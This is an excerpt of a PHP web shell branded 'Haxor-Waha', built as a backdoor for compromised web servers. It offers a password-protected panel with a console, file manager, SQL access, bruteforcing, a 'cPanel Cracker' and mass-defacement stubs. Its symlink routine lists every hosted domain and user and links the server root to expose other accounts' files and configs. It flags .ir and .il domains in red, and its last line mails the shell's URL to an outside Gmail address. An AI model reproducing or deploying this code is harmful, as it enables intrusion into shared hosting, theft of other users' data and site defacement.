...
$auth_pass = "3188b203c30b8f1c1ae87ab382783d23";
$color = "#fe9b00";
...
<style>
    ...
    h1            { border:1px solid <?php echo $color?>;padding: 2px 5px;font: 14pt Verdana;margin:0px; }
    div.content    { padding: 5px;margin-left:5px;}
    a            { text-decoration:none; }
    a:hover        { background:#5e5e5e; }
    .ml1        { border:1px solid #444;padding:5px;margin:0;overflow: auto; }
    .bigarea    { width:100%;height:250px; }
    input, textarea, select    { margin:0;color:#00ff00;background-color:#000;border:1px solid <?php echo $color?>; font: 9pt Monospace,"Courier New"; }
    input[type="button"]:hover,input[type="submit"]:hover {background-color:<?php echo $color?>;color:#000;} 
    form        { margin:0px; }
    ...
    .logo {text-align:center;font-size:60px;margin-top: 6px;}
    .logo sup {font-size: 15px;vertical-align: top;margin-left: -14px;}
    .cpr {color:<?php echo $color;?>; margin-bottom:5px;}
...
<?php
    ...
    $millink='<form action="http://1337day.com/search" method="post" id="mil" target="_blank" style="display:inline;"><a href="#" onclick="javascript:document.forms[\'mil\'].submit()">[1337day.com]</a>';
    if( strpos('Linux', $kernel) !== false ){
        $millink .= '<input type="hidden" name="dong" value="' . urlencode( 'Linux Kernel ' . substr($release,0,6)) . '"/></form>';
        $edblink .= urlencode( 'Linux Kernel ' . substr($release,0,6) );
    } else {
        $millink .= '<input type="hidden" name="dong" value="' . urlencode( $kernel . ' ' . substr($release,0,3)) . '"/></form>';
        $edblink .= urlencode( $kernel . ' ' . substr($release,0,3) );
    }
    ...
    $m = array('Sec. Info'=>'SecInfo','Files'=>'FilesMan','Console'=>'Console','Sql'=>'Sql','Php'=>'Php','Safe mode'=>'SafeMode','String tools'=>'StringTools','Bruteforce'=>'Bruteforce','Network'=>'Network','Symlink'=>'Symlink','cPanel Cracker'=>'Cpanel','Mass Defacer'=>'MassDeface','Zone Submit'=>'ZoneSubmit');
    ...
    echo '<table class="info" cellpadding="3" cellspacing="0" width="100%"><tr><td width="150"><div class="logo">WAHA<sup>&reg;</sup></div></td><td width=1><span>Uname<br>User<br>Php<br>Hdd<br>Cwd'.($GLOBALS['os'] == 'win'?'<br>Drives':'').'</span></td>'.
         ...
         '<br/><table cellpadding=3 cellspacing=0 width=100%><tr>'.$menu.'</tr></table><div style="margin:5">';
}
...
<hr/>
<center class="cpr">&copy; Haxor-Waha</center>
</div>
</body></html>
<?php
}
...
<center><img src=http://i45.tinypic.com/70hs8n.jpg></center>
...
function actionSelfRemove() {
    ...
    if($_POST['p1'] == 'yes') {
        if(@unlink(SELF_PATH))
            die('Shell has been Fucked');
        else
            echo 'unlink error!';
    }
    echo '<h1>Suicide</h1><div class=content>Really want to Fuck the shell?<br><a href=# onclick="g(null,null,\'yes\')">Yes</a></div>';
    printFooter();
}
...
function actionSymlink() {
    ...
    echo '<div class="content"><center>
                <h3>[ <a href="#" onclick="g(\'symlink\',null,\'website\',null)">Domains</a> ] - 
                    ...
                    [ <a href="#" onclick="g(\'symlink\',null,\'config\',null)">Config File symlink</a> ]</h3></center>';
    ...
    if(isset($_POST['p1']) && $_POST['p1']=='website')
    {
        ...
        if(!$d0mains){ 
            ...
            echo "<table align=center class='main' border=0 ><tr bgcolor=\"#5e5e5e\"><td>Count</td><td>domains</td><td>users</td></tr>";
            $count=1;
            foreach($d0mains as $d0main){
                if(@eregi("zone",$d0main)){
                    ...
                    if(strlen(trim($domains[1][0])) > 2){
                        ...
                        echo "<tr><td>".$count."</td><td><a href=http://".$domains[1][0]."/>".$domains[1][0]."</a></td><td>".$user['name']."</td></tr>";
                        flush();
                        $count++;
                    }
                }
    ...
    if(isset($_POST['p1']) && $_POST['p1']=='whole')
    {
        ...
        if(!$d0mains) {
            ...
            echo "<table align='center' width='40%' class='main'><tr bgcolor=\"#5e5e5e\"><td> Count </td><td> Domains </td><td> User </td><td> Symlink </td></tr>";
            $count=1;
            foreach($d0mains as $d0main){
                if(@eregi('zone',$d0main)){
                    ...
                    if(strlen(trim($domain[1][0])) >2){
                        ...
                        @symlink('/','sym/root');
                        $ddt = $domain[1][0];
                        if(@eregi("\.ir",$domain[1][0]) or @eregi("\.il",$domain[1][0])) {
                            $ddt = "<div style=' color: #FF0000 ; text-shadow: 0px 0px 1px red; '>".$domain[1][0].'</div>';
                        }
                        echo "<tr><td>".$count++."</td><td><a target='_blank' href=http://".$domain[1][0].'/>'.$ddt.' </a></td><td>'.$user['name']."</td><td><a href='sym/root/home/".$user['name']."/public_html' target='_blank'>symlink </a></td></tr>";
                        flush();
                    }
                }
            }
    ...
    if(isset($_POST['p1']) && $_POST['p1']=='config')
    {
        ...
        if(!$d0mains) {
            ...
            echo "<table align='center' width='40%' class='main' ><tr bgcolor=\"#5e5e5e\"><td> Count </td><td> Domains </td><td> Script </td></tr>";
            $count = 1;
            foreach($d0mains as $d0main){
                if(@eregi('zone',$d0main)){
                    preg_match_all('#zone "(.*)"#',$d0main,$domain);
                    ...
                    if(strlen(trim($domain[1][0]))>2){
                        ...
                        echo '<tr><td>'.$count++.'</td><td><a href=http://www.'.$domain[1][0].'/>'.$domain[1][0].'</a></td><td>'.$user['name'].'</td><td>'.$out.'</td></tr>';
                        flush();
                    }
                }
            }
...
function actionMassDeface() {
    printHeader();
    echo '<h1>Mass Defaceer</h1>';
    echo "<pre class=ml1 style='margin-top:5px'>Comming Soon !!!</pre></center>"; 
    printFooter();        
}

function actionZoneSubmit() {
    printHeader();
    echo '<h1>Zone-h Submiter</h1>';
    echo "<pre class=ml1 style='margin-top:5px'>Comming Soon !!!</pre></center>"; 
    printFooter();            
}
...
@mail("hacker_waha@gmail.com","shell",$url);
